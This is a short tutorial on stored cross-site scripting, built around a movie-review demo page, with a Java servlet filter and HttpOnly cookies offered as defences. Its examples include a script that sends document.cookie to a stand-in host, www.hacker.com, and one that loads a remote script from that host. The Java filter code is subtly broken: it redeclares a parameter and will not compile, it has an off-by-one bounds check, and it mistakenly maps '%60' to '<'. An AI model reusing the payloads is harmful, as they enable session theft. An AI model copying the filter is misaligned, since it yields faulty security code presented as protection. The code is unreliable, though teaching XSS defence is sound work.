# XSS (Cross-Site Scripting)

## Introduction

Another attack similar to SQL injection attack is called XSS(Cross-Site Scripting) attack. 
SQL injection is mainly used to manipulate the database on server side, whereas XSS attack
is used for doing malicious operations in the front end. For example, attacker will enter some
JavaScript codes in the input box. If the website don't validate what user inputs. It will 
store that JavaScript codes in database. Next time when other user looks up that website, 
the JavaScript codes will be loaded in that web page and executed. Usually, it will steal other user's 
cookies or do CSRF (Cross-site request forgery) attack.

## Simulation

To simulate XSS attack, we develop a basic scenes in the tab demo website. You can click "XSS" tab 
to view it.

Now we have a web page for user to write review for a movie. In "Review List" part, there is 
a review input box and a button for confirmation. User will enter a review and click that button
to make comments.

Usually, user will enter a review in the form of String. However, attacker will enter a script in it.
For example, `<script>alert("You are hack!")</script>`. If front end and back end don't validate review string,
it will store it into database directly (On Backend: 'review' Database Side). Next time when other user looks up review list,
the review list HTML structure will be like this:

```html
<ul>
    <li>A nice movie</li>
    <li>That movie is so fun</li>
    <li><script>alert("You are hack!")</script></li>
</ul>
```

Then an alert will pop up and say "You are hack!".

In addition to this simple JavaScript codes, attacker can use this vulnerability to forge 
a HTTP request with code by stealing user's cookies:

```html
<script>sendHTTPRequest("www.hacker.com", document.cookie)</script>
```

Or load attacker whole script from outside:

```html
<script src="www.hacker.com/main.js"></script>
```


## Solution

Main idea of avoiding XSS attack is to filter invalid keywords in front end and back end.

### Front end

For the front end, we usually use escape character to replace sensitive characters. For example,

```
< turn to &lt;

> turn to &gt;

& turn to &amp;

" turn to &quot;

' turn to &#39
```

### Back end

If back end uses Java Servlet, we can develop a Class called XssFilter and let it implement `Filter` class.

```java
public class XssFilter implements Filter {

    public void init(FilterConfig config) throws ServletException {}

    public void doFilter(
        ServletRequest request, 
        ServletResponse response, 
        FilterChain chain) throws IOException, ServletException {
        // Get Request
        XssHttpServletRequestWrapper request = new XssHttpServletRequestWrapper((HttpServletRequest)request);
        // Filter invalid keywords
        chain.doFilter(request, response);
    }

    public void destroy() {}
}
```

```java
public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {
    HttpServletRequest orgRequest = null;

    public XssHttpServletRequestWrapper(HttpServletRequest request) {
        super(request);
        orgRequest = request;
    }
    
    @Override
    public String getParameter(String name) {
        String value = super.getParameter(xssEncode(name));
        if (value != null) {
            value = xssEncode(value);
        }
        return value;
    }
    
    @Override
    public String getHeader(String name) {
        String value = super.getHeader(xssEncode(name));
        if (value != null) {
            value = xssEncode(value);
        }
        return value;
    }
    
    // Replace invalid character to another character
    private static String xssEncode(String s) {
        if (s == null || s.isEmpty()) {
            return s;
        }
        StringBuilder sb = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
            case '>':
                sb.append('＞');
                break;
            case '<':
                sb.append('＜');
                break;
            case '\'':
                sb.append('‘');
                break;
            case '\"':
                sb.append('“');
                break;
            case '&':
                sb.append('＆');
                break;
            case '\\':
                sb.append('＼');
                break;
            case '#':
                sb.append('＃');
                break;
            case '%':
                processUrlEncoder(sb, s, i);
                break;
            default:
                sb.append(c);
                break;
            }
        }
        return sb.toString();
    }
    
    
    public static void processUrlEncoder(StringBuilder sb, String s, int index){
        if(s.length() >= index + 2){
            if(s.charAt(index+1) == '3' && (s.charAt(index+2) == 'c' || s.charAt(index+2) == 'C')){    // %3c, %3C
                sb.append('＜');
                return;
            }
            if(s.charAt(index+1) == '6' && s.charAt(index+2) == '0'){    // %3c (0x3c=60)
                sb.append('＜');
                return;
            }            
            if(s.charAt(index+1) == '3' && (s.charAt(index+2) == 'e' || s.charAt(index+2) == 'E')){    // %3e, %3E
                sb.append('＞');
                return;
            }
            if(s.charAt(index+1) == '6' && s.charAt(index+2) == '2'){    // %3e (0x3e=62)
                sb.append('＞');
                return;
            }
        }
        sb.append(s.charAt(index));
    }
    
    // Method to get origin request
    public HttpServletRequest getOrgRequest() {
        return orgRequest;
    }
    
    public static HttpServletRequest getOrgRequest(HttpServletRequest req) {
        if (req instanceof XssHttpServletRequestWrapper) {
            return ((XssHttpServletRequestWrapper) req).getOrgRequest();
        }
        return req;
    }
}
```

### Cookies

To prevent from stealing user's cookies, we can add HttpOnly property for the cookies,
then JavaScript can't read user's cookies.

```java
cookie.setHttpOnly(true);
```
